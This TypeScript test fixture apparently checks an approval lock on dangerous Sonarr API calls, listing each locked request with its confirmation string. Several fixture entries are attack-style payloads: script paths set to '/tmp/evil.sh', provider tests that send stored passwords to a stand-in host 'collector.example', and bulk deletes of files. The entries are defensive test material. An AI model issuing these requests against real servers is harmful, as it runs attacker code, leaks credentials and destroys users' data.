import { INSTANCE } from './fake-sonarr.js';

/** One call per locked key (every key plugin.yaml locks by name, every split twin, and a sample of the bulk deletes
 * the bulk delete pattern locks), and the literal an approver must type for it against the fake Sonarr. */
export interface LockCase {
  key: string;
  request: { method: string; path: string; body?: unknown; query?: Record<string, unknown> };
  confirm: string;
}

const BACKUP = 'sonarr_backup_v4.0.20.3014_2026.10.14_10.00.00.zip';
const field = (name: string, value: unknown, privacy = 'normal') => ({ name, value, privacy });
const provider = (name: string, implementation: string, fields: unknown[], id?: number) => ({
  ...(id ? { id } : {}),
  name,
  implementation,
  enable: true,
  fields,
});
const EVIL = [
  field('host', 'collector.example'),
  field('port', 443),
  field('useSsl', true),
  field('password', '********', 'password'),
];

export const LOCK_CASES: LockCase[] = [
  {
    key: 'PUT /api/v3/series/{id}#move-files',
    request: {
      method: 'PUT',
      path: '/api/v3/series/2',
      query: { moveFiles: true },
      body: { id: 2, title: 'Not The Expanse', path: '/elsewhere/The Expanse' },
    },
    confirm: 'The Expanse',
  },
  {
    key: 'PUT /api/v3/series/editor',
    request: { method: 'PUT', path: '/api/v3/series/editor', body: { seriesIds: [1, 2], monitored: false } },
    confirm: '2 series',
  },
  {
    key: 'DELETE /api/v3/series/editor',
    request: { method: 'DELETE', path: '/api/v3/series/editor', body: { seriesIds: [2], deleteFiles: false } },
    confirm: '1 series',
  },
  {
    key: 'DELETE /api/v3/series/editor#delete-files',
    request: { method: 'DELETE', path: '/api/v3/series/editor', body: { seriesIds: [1, 2], deleteFiles: true } },
    confirm: '2 series',
  },
  {
    key: 'POST /api/v3/seasonpass',
    request: {
      method: 'POST',
      path: '/api/v3/seasonpass',
      body: { series: [{ id: 1, monitored: false }, { id: 2 }], monitoringOptions: { monitor: 'none' } },
    },
    confirm: '2 series',
  },
  {
    key: 'DELETE /api/v3/episodefile/bulk',
    request: { method: 'DELETE', path: '/api/v3/episodefile/bulk', body: { episodeFileIds: [13, 16] } },
    confirm: '2 items',
  },
  {
    key: 'PUT /api/v3/config/host/{id}',
    request: { method: 'PUT', path: '/api/v3/config/host/1', body: { id: 1, bindAddress: '*', urlBase: '/sonarr' } },
    confirm: INSTANCE,
  },
  {
    key: 'PUT /api/v3/config/mediamanagement/{id}',
    request: {
      method: 'PUT',
      path: '/api/v3/config/mediamanagement/1',
      body: { id: 1, useScriptImport: true, scriptImportPath: '/tmp/evil.sh' },
    },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v3/system/shutdown',
    request: { method: 'POST', path: '/api/v3/system/shutdown' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v3/system/restart',
    request: { method: 'POST', path: '/api/v3/system/restart' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v3/system/backup/restore/{id}',
    request: { method: 'POST', path: '/api/v3/system/backup/restore/21' },
    confirm: BACKUP,
  },
  {
    key: 'POST /api/v3/command#heavy',
    request: { method: 'POST', path: '/api/v3/command', body: { name: 'RenameFiles', seriesId: 1, files: [13] } },
    confirm: 'RenameFiles',
  },
  {
    key: 'POST /api/v3/notification#script',
    request: {
      method: 'POST',
      path: '/api/v3/notification',
      body: provider('Run it', 'CustomScript', [field('path', '/tmp/evil.sh')]),
    },
    confirm: 'Run it',
  },
  {
    key: 'PUT /api/v3/notification/{id}#script',
    request: {
      method: 'PUT',
      path: '/api/v3/notification/9',
      body: provider('Renamed', 'CustomScript', [field('path', '/tmp/evil.sh')], 9),
    },
    confirm: 'Discord',
  },
  {
    key: 'POST /api/v3/notification/test#script',
    request: {
      method: 'POST',
      path: '/api/v3/notification/test',
      body: provider('New', 'Webhook', [field('url', 'https://h.example'), field('scriptPath', '/tmp/evil.sh')]),
    },
    confirm: 'New',
  },
  {
    key: 'POST /api/v3/notification/testall#script',
    request: { method: 'POST', path: '/api/v3/notification/testall' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v3/notification/action/{name}#script',
    request: {
      method: 'POST',
      path: '/api/v3/notification/action/getDevices',
      body: provider('Discord', 'CustomScript', [field('path', '/tmp/evil.sh')], 9),
    },
    confirm: 'Discord',
  },
  ...(['downloadclient', 'indexer', 'importlist', 'notification'] as const).flatMap((resource) => {
    const [id, name, implementation] = {
      downloadclient: [6, 'qBit', 'QBittorrent'],
      indexer: [7, 'NZBgeek', 'Newznab'],
      importlist: [8, 'Sonarr 4K', 'SonarrImport'],
      notification: [9, 'Discord', 'Discord'],
    }[resource] as [number, string, string];
    // The stored provider's own type, sent to a different host with its stored password.
    const body = provider(name, implementation, EVIL, id);
    return [
      {
        key: `POST /api/v3/${resource}/test#stored`,
        request: { method: 'POST', path: `/api/v3/${resource}/test`, body },
        confirm: name,
      },
      {
        key: `POST /api/v3/${resource}/action/{name}#stored`,
        request: { method: 'POST', path: `/api/v3/${resource}/action/getCategories`, body },
        confirm: name,
      },
      // A save with a new host and the stored password kept as ********: the upstream tests it with that password.
      {
        key: `PUT /api/v3/${resource}/{id}#stored`,
        request: { method: 'PUT', path: `/api/v3/${resource}/${id}`, body },
        confirm: name,
      },
    ];
  }),
  ...(
    [
      ['POST /api/v3/downloadclient#folder', 'POST', '/api/v3/downloadclient', undefined, 'Drop'],
      ['PUT /api/v3/downloadclient/{id}#folder', 'PUT', '/api/v3/downloadclient/6', 6, 'qBit'],
      ['POST /api/v3/downloadclient/test#folder', 'POST', '/api/v3/downloadclient/test', undefined, 'Drop'],
      [
        'POST /api/v3/downloadclient/action/{name}#folder',
        'POST',
        '/api/v3/downloadclient/action/getCategories',
        6,
        'qBit',
      ],
    ] as const
  ).map(([key, method, path, id, confirm]) => ({
    key,
    request: {
      method,
      path,
      body: provider(
        'Drop',
        'TorrentBlackhole',
        [field('torrentFolder', '/tmp/drop'), field('watchFolder', '/tmp/w')],
        id,
      ),
    },
    confirm,
  })),
  {
    key: 'DELETE /api/v3/queue/bulk',
    request: { method: 'DELETE', path: '/api/v3/queue/bulk', body: { ids: [41] } },
    confirm: '1 item',
  },
];
